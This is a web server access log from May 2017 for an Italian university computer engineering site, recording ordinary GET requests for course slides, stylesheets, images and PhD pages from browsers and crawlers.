93.57.120.82 - - [21/May/2017:12:51:50 +0200] "GET /courses/sdcc1617/lucidi/StorageCloud.pdf HTTP/1.1" 206 4096 "http://www.ce.uniroma2.it/courses/sdcc1617/lucidi/StorageCloud.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
93.57.120.82 - - [21/May/2017:12:51:48 +0200] "GET /courses/sdcc1617/lucidi/StorageCloud.pdf HTTP/1.1" 200 1988350 "http://www.ce.uniroma2.it/courses/sdcc1617/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
93.57.120.82 - - [21/May/2017:12:51:50 +0200] "GET /courses/sdcc1617/lucidi/StorageCloud.pdf HTTP/1.1" 206 1863680 "http://www.ce.uniroma2.it/courses/sdcc1617/lucidi/StorageCloud.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
93.57.120.82 - - [21/May/2017:12:51:50 +0200] "GET /courses/sdcc1617/lucidi/StorageCloud.pdf HTTP/1.1" 206 1953792 "http://www.ce.uniroma2.it/courses/sdcc1617/lucidi/StorageCloud.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
93.57.120.82 - - [21/May/2017:12:51:51 +0200] "GET /courses/sdcc1617/lucidi/StorageCloud.pdf HTTP/1.1" 206 16384 "http://www.ce.uniroma2.it/courses/sdcc1617/lucidi/StorageCloud.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
93.57.120.82 - - [21/May/2017:12:51:51 +0200] "GET /courses/sdcc1617/lucidi/StorageCloud.pdf HTTP/1.1" 206 1843200 "http://www.ce.uniroma2.it/courses/sdcc1617/lucidi/StorageCloud.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
93.57.120.82 - - [21/May/2017:12:51:51 +0200] "GET /courses/sdcc1617/lucidi/StorageCloud.pdf HTTP/1.1" 206 4096 "http://www.ce.uniroma2.it/courses/sdcc1617/lucidi/StorageCloud.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
93.57.120.82 - - [21/May/2017:12:51:51 +0200] "GET /courses/sdcc1617/lucidi/StorageCloud.pdf HTTP/1.1" 206 1826816 "http://www.ce.uniroma2.it/courses/sdcc1617/lucidi/StorageCloud.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
93.57.120.82 - - [21/May/2017:12:51:51 +0200] "GET /courses/sdcc1617/lucidi/StorageCloud.pdf HTTP/1.1" 206 49152 "http://www.ce.uniroma2.it/courses/sdcc1617/lucidi/StorageCloud.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
93.57.120.82 - - [21/May/2017:12:51:52 +0200] "GET /courses/sdcc1617/lucidi/StorageCloud.pdf HTTP/1.1" 206 1781760 "http://www.ce.uniroma2.it/courses/sdcc1617/lucidi/StorageCloud.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
93.57.120.82 - - [21/May/2017:12:51:52 +0200] "GET /courses/sdcc1617/lucidi/StorageCloud.pdf HTTP/1.1" 206 12288 "http://www.ce.uniroma2.it/courses/sdcc1617/lucidi/StorageCloud.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
93.57.120.82 - - [21/May/2017:12:51:53 +0200] "GET /courses/sdcc1617/lucidi/StorageCloud.pdf HTTP/1.1" 206 4096 "http://www.ce.uniroma2.it/courses/sdcc1617/lucidi/StorageCloud.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
93.57.120.82 - - [21/May/2017:12:51:52 +0200] "GET /courses/sdcc1617/lucidi/StorageCloud.pdf HTTP/1.1" 206 1765376 "http://www.ce.uniroma2.it/courses/sdcc1617/lucidi/StorageCloud.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
93.57.120.82 - - [21/May/2017:12:51:53 +0200] "GET /courses/sdcc1617/lucidi/StorageCloud.pdf HTTP/1.1" 206 4096 "http://www.ce.uniroma2.it/courses/sdcc1617/lucidi/StorageCloud.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
93.57.120.82 - - [21/May/2017:12:51:53 +0200] "GET /courses/sdcc1617/lucidi/StorageCloud.pdf HTTP/1.1" 206 5886 "http://www.ce.uniroma2.it/courses/sdcc1617/lucidi/StorageCloud.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
93.57.120.82 - - [21/May/2017:12:51:53 +0200] "GET /courses/sdcc1617/lucidi/StorageCloud.pdf HTTP/1.1" 206 1988350 "http://www.ce.uniroma2.it/courses/sdcc1617/lucidi/StorageCloud.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
93.57.120.82 - - [21/May/2017:12:51:53 +0200] "GET /courses/sdcc1617/lucidi/StorageCloud.pdf HTTP/1.1" 206 1716224 "http://www.ce.uniroma2.it/courses/sdcc1617/lucidi/StorageCloud.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
93.57.120.82 - - [21/May/2017:12:52:07 +0200] "GET /courses/sdcc1617/lucidi/IntroBigData.pdf HTTP/1.1" 206 4372800 "http://www.ce.uniroma2.it/courses/sdcc1617/lucidi/IntroBigData.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
93.57.120.82 - - [21/May/2017:12:52:07 +0200] "GET /courses/sdcc1617/lucidi/IntroBigData.pdf HTTP/1.1" 206 2368 "http://www.ce.uniroma2.it/courses/sdcc1617/lucidi/IntroBigData.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
93.57.120.82 - - [21/May/2017:12:52:07 +0200] "GET /courses/sdcc1617/lucidi/IntroBigData.pdf HTTP/1.1" 206 8192 "http://www.ce.uniroma2.it/courses/sdcc1617/lucidi/IntroBigData.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
93.57.120.82 - - [21/May/2017:12:52:07 +0200] "GET /courses/sdcc1617/lucidi/IntroBigData.pdf HTTP/1.1" 206 4096 "http://www.ce.uniroma2.it/courses/sdcc1617/lucidi/IntroBigData.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
93.57.120.82 - - [21/May/2017:12:52:07 +0200] "GET /courses/sdcc1617/lucidi/IntroBigData.pdf HTTP/1.1" 200 4372800 "http://www.ce.uniroma2.it/courses/sdcc1617/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
93.57.120.82 - - [21/May/2017:12:52:07 +0200] "GET /courses/sdcc1617/lucidi/IntroBigData.pdf HTTP/1.1" 206 4333568 "http://www.ce.uniroma2.it/courses/sdcc1617/lucidi/IntroBigData.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
93.57.120.82 - - [21/May/2017:12:52:08 +0200] "GET /courses/sdcc1617/lucidi/IntroBigData.pdf HTTP/1.1" 206 4372800 "http://www.ce.uniroma2.it/courses/sdcc1617/lucidi/IntroBigData.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
93.57.120.82 - - [21/May/2017:12:52:08 +0200] "GET /courses/sdcc1617/lucidi/IntroBigData.pdf HTTP/1.1" 206 10560 "http://www.ce.uniroma2.it/courses/sdcc1617/lucidi/IntroBigData.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
93.57.120.82 - - [21/May/2017:12:52:08 +0200] "GET /courses/sdcc1617/lucidi/IntroBigData.pdf HTTP/1.1" 206 3899392 "http://www.ce.uniroma2.it/courses/sdcc1617/lucidi/IntroBigData.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
93.57.120.82 - - [21/May/2017:12:52:09 +0200] "GET /courses/sdcc1617/lucidi/IntroBigData.pdf HTTP/1.1" 206 90112 "http://www.ce.uniroma2.it/courses/sdcc1617/lucidi/IntroBigData.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
93.57.120.82 - - [21/May/2017:12:52:09 +0200] "GET /courses/sdcc1617/lucidi/IntroBigData.pdf HTTP/1.1" 206 16384 "http://www.ce.uniroma2.it/courses/sdcc1617/lucidi/IntroBigData.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
93.57.120.82 - - [21/May/2017:12:52:09 +0200] "GET /courses/sdcc1617/lucidi/IntroBigData.pdf HTTP/1.1" 206 32768 "http://www.ce.uniroma2.it/courses/sdcc1617/lucidi/IntroBigData.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
93.57.120.82 - - [21/May/2017:12:52:09 +0200] "GET /courses/sdcc1617/lucidi/IntroBigData.pdf HTTP/1.1" 206 3530752 "http://www.ce.uniroma2.it/courses/sdcc1617/lucidi/IntroBigData.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
93.57.120.82 - - [21/May/2017:12:52:12 +0200] "GET /courses/sdcc1617/lucidi/IntroBigData.pdf HTTP/1.1" 206 73728 "http://www.ce.uniroma2.it/courses/sdcc1617/lucidi/IntroBigData.pdf" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063"
216.244.66.246 - - [21/May/2017:12:52:55 +0200] "GET /index.php/comunicazioni/visualizza/codemotion_ibm_borse_di_studio_su_bpm HTTP/1.1" 200 8054 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
93.57.120.82 - - [21/May/2017:12:53:09 +0200] "GET /courses/sdcc1617/template/css/style.css HTTP/1.1" 304 - "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; ms-office; MSOffice 16)"
93.57.120.82 - - [21/May/2017:12:53:09 +0200] "GET /courses/sdcc1617/template/css/bootstrap.css HTTP/1.1" 304 - "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; ms-office; MSOffice 16)"
93.57.120.82 - - [21/May/2017:12:53:09 +0200] "GET /courses/sdcc1617/template/css/style.css HTTP/1.1" 304 - "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; ms-office; MSOffice 16)"
93.57.120.82 - - [21/May/2017:12:53:09 +0200] "GET /courses/sdcc1617/template/css/bootstrap.css HTTP/1.1" 304 - "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; ms-office; MSOffice 16)"
93.36.168.154 - - [21/May/2017:12:53:11 +0200] "GET / HTTP/1.1" 200 1764 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.1 Safari/603.1.30"
93.36.168.154 - - [21/May/2017:12:53:11 +0200] "GET /logoUniroma2.gif HTTP/1.1" 200 9945 "http://www.ce.uniroma2.it/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.1 Safari/603.1.30"
93.36.168.154 - - [21/May/2017:12:53:11 +0200] "GET /LogoCE-blue.gif HTTP/1.1" 200 775 "http://www.ce.uniroma2.it/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.1 Safari/603.1.30"
93.36.168.154 - - [21/May/2017:12:53:11 +0200] "GET /logoIngegneriapiccolo.jpg HTTP/1.1" 200 4023 "http://www.ce.uniroma2.it/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.1 Safari/603.1.30"
93.36.168.154 - - [21/May/2017:12:53:12 +0200] "GET /favicon.ico HTTP/1.1" 200 318 "http://www.ce.uniroma2.it/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.1 Safari/603.1.30"
216.244.66.246 - - [21/May/2017:12:53:25 +0200] "GET /index.php/triennale_sessioni HTTP/1.1" 200 13704 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
87.7.187.81 - - [21/May/2017:12:53:57 +0200] "GET /courses/sdcc1617/ HTTP/1.1" 200 17254 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
180.76.15.15 - - [21/May/2017:12:53:59 +0200] "GET /psblas/ HTTP/1.1" 200 380 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
87.14.254.73 - - [21/May/2017:12:56:25 +0200] "GET /~lopresti/Didattica/RetiWeb/RetiWeb0809/HTTP.pdf HTTP/1.1" 200 141651 "https://www.google.it/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0"
87.14.254.73 - - [21/May/2017:12:56:25 +0200] "GET /favicon.ico HTTP/1.1" 200 318 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0"
87.14.254.73 - - [21/May/2017:12:56:25 +0200] "GET /~lopresti/Didattica/RetiWeb/RetiWeb0809/HTTP.pdf HTTP/1.1" 206 10579 "https://www.google.it/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0"
87.14.254.73 - - [21/May/2017:12:56:25 +0200] "GET /~lopresti/Didattica/RetiWeb/RetiWeb0809/HTTP.pdf HTTP/1.1" 206 65536 "https://www.google.it/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0"
212.83.174.55 - - [21/May/2017:12:56:26 +0200] "GET / HTTP/1.1" 200 11462 "-" "Mozilla"
87.7.187.81 - - [21/May/2017:12:57:27 +0200] "GET /courses/sdcc1617/ HTTP/1.1" 200 17254 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
66.249.93.73 - - [21/May/2017:12:58:10 +0200] "GET /~lopresti/Didattica/RetiWeb/RetiWeb0809/IntroJSP.pdf HTTP/1.1" 200 217370 "https://www.google.it/" "Mozilla/5.0 (Linux; Android 7.0; SM-G925F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
104.154.49.2 - - [21/May/2017:12:58:53 +0200] "GET /asbda2017/?feed=rss2 HTTP/1.1" 200 3487 "-" "Java/1.8.0_121"
64.71.171.78 - - [21/May/2017:13:00:05 +0200] "GET /courses/sdcc1617/template/css/style.css HTTP/1.1" 200 737 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; ms-office; MSOffice 16)"
64.71.171.78 - - [21/May/2017:13:00:07 +0200] "GET /courses/sdcc1617/template/css/bootstrap.css HTTP/1.1" 200 21157 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; ms-office; MSOffice 16)"
64.71.171.78 - - [21/May/2017:13:00:08 +0200] "GET /courses/sdcc1617/template/css/style.css HTTP/1.1" 200 737 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; ms-office; MSOffice 16)"
64.71.171.78 - - [21/May/2017:13:00:09 +0200] "GET /courses/sdcc1617/template/css/bootstrap.css HTTP/1.1" 200 21157 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; ms-office; MSOffice 16)"
104.197.197.203 - - [21/May/2017:13:00:21 +0200] "GET /acpross2017/?feed=rss2 HTTP/1.1" 200 3664 "-" "Java/1.8.0_121"
87.7.187.81 - - [21/May/2017:13:00:58 +0200] "GET /courses/sdcc1617/ HTTP/1.1" 200 17254 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
64.71.171.78 - - [21/May/2017:13:01:29 +0200] "GET /courses/sdcc1617/template/css/style.css HTTP/1.1" 200 737 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; ms-office; MSOffice 16)"
64.71.171.78 - - [21/May/2017:13:01:31 +0200] "GET /courses/sdcc1617/template/css/bootstrap.css HTTP/1.1" 200 21157 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; ms-office; MSOffice 16)"
64.71.171.78 - - [21/May/2017:13:01:32 +0200] "GET /courses/sdcc1617/template/css/style.css HTTP/1.1" 200 737 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; ms-office; MSOffice 16)"
64.71.171.78 - - [21/May/2017:13:01:33 +0200] "GET /courses/sdcc1617/template/css/bootstrap.css HTTP/1.1" 200 21157 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; ms-office; MSOffice 16)"
94.70.48.156 - - [21/May/2017:13:02:27 +0200] "GET /dottorato/index.php?option=com_content&view=article&id=136 HTTP/1.1" 200 3616 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
94.70.48.156 - - [21/May/2017:13:02:27 +0200] "GET /dottorato/index.php?option=com_content&view=article&id=134&Itemid=113 HTTP/1.1" 200 2998 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
94.70.48.156 - - [21/May/2017:13:02:27 +0200] "GET /dottorato/plugins/content/attachments1.css HTTP/1.1" 200 93 "http://www.ce.uniroma2.it/dottorato/index.php?option=com_content&view=article&id=136" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
94.70.48.156 - - [21/May/2017:13:02:28 +0200] "GET /dottorato/templates/system/css/system.css HTTP/1.1" 200 517 "http://www.ce.uniroma2.it/dottorato/index.php?option=com_content&view=article&id=136" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
94.70.48.156 - - [21/May/2017:13:02:28 +0200] "GET /dottorato/templates/system/css/general.css HTTP/1.1" 200 762 "http://www.ce.uniroma2.it/dottorato/index.php?option=com_content&view=article&id=136" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
94.70.48.156 - - [21/May/2017:13:02:28 +0200] "GET /dottorato/templates/phd_template/css/template.css HTTP/1.1" 200 6703 "http://www.ce.uniroma2.it/dottorato/index.php?option=com_content&view=article&id=136" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
94.70.48.156 - - [21/May/2017:13:02:28 +0200] "GET /dottorato/media/system/js/mootools.js HTTP/1.1" 200 20283 "http://www.ce.uniroma2.it/dottorato/index.php?option=com_content&view=article&id=136" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
94.70.48.156 - - [21/May/2017:13:02:28 +0200] "GET /dottorato/media/system/js/caption.js HTTP/1.1" 200 921 "http://www.ce.uniroma2.it/dottorato/index.php?option=com_content&view=article&id=136" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
94.70.48.156 - - [21/May/2017:13:02:28 +0200] "GET /dottorato/plugins/content/attachments_refresh.js HTTP/1.1" 200 738 "http://www.ce.uniroma2.it/dottorato/index.php?option=com_content&view=article&id=136" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
94.70.48.156 - - [21/May/2017:13:02:28 +0200] "GET /dottorato/media/system/js/modal.js HTTP/1.1" 200 3110 "http://www.ce.uniroma2.it/dottorato/index.php?option=com_content&view=article&id=136" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
94.70.48.156 - - [21/May/2017:13:02:28 +0200] "GET /dottorato/templates/phd_template/script.js HTTP/1.1" 200 1995 "http://www.ce.uniroma2.it/dottorato/index.php?option=com_content&view=article&id=136" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
94.70.48.156 - - [21/May/2017:13:02:28 +0200] "GET /dottorato/templates/phd_template/jquery.js HTTP/1.1" 200 24555 "http://www.ce.uniroma2.it/dottorato/index.php?option=com_content&view=article&id=136" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
94.70.48.156 - - [21/May/2017:13:02:28 +0200] "GET /dottorato/templates/phd_template/images/blockheader.png HTTP/1.1" 200 3573 "http://www.ce.uniroma2.it/dottorato/templates/phd_template/css/template.css" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
94.70.48.156 - - [21/May/2017:13:02:28 +0200] "GET /dottorato/templates/phd_template/images/vmenuitem.png HTTP/1.1" 200 652 "http://www.ce.uniroma2.it/dottorato/templates/phd_template/css/template.css" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
94.70.48.156 - - [21/May/2017:13:02:28 +0200] "GET /dottorato/templates/phd_template/images/menuitem.png HTTP/1.1" 200 4277 "http://www.ce.uniroma2.it/dottorato/templates/phd_template/css/template.css" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
94.70.48.156 - - [21/May/2017:13:02:28 +0200] "GET /dottorato/templates/phd_template/images/nav.png HTTP/1.1" 200 873 "http://www.ce.uniroma2.it/dottorato/templates/phd_template/css/template.css" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
94.70.48.156 - - [21/May/2017:13:02:28 +0200] "GET /dottorato/templates/phd_template/images/vsubitem.gif HTTP/1.1" 200 1314 "http://www.ce.uniroma2.it/dottorato/templates/phd_template/css/template.css" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
94.70.48.156 - - [21/May/2017:13:02:28 +0200] "GET /dottorato/templates/phd_template/images/footer_b.png HTTP/1.1" 200 85 "http://www.ce.uniroma2.it/dottorato/templates/phd_template/css/template.css" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
94.70.48.156 - - [21/May/2017:13:02:28 +0200] "GET /dottorato/templates/phd_template/images/footer_s.png HTTP/1.1" 200 143 "http://www.ce.uniroma2.it/dottorato/templates/phd_template/css/template.css" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
94.70.48.156 - - [21/May/2017:13:02:28 +0200] "GET /dottorato/templates/phd_template/images/menuseparator.png HTTP/1.1" 200 79 "http://www.ce.uniroma2.it/dottorato/templates/phd_template/css/template.css" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
94.70.48.156 - - [21/May/2017:13:02:28 +0200] "GET /dottorato/templates/phd_template/images/Bottom_texture.jpg HTTP/1.1" 200 23219 "http://www.ce.uniroma2.it/dottorato/templates/phd_template/css/template.css" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
94.70.48.156 - - [21/May/2017:13:02:28 +0200] "GET /dottorato/templates/phd_template/images/sheet_s.png HTTP/1.1" 200 716 "http://www.ce.uniroma2.it/dottorato/templates/phd_template/css/template.css" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
94.70.48.156 - - [21/May/2017:13:02:28 +0200] "GET /dottorato/templates/phd_template/images/page_gl.png HTTP/1.1" 200 21708 "http://www.ce.uniroma2.it/dottorato/templates/phd_template/css/template.css" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
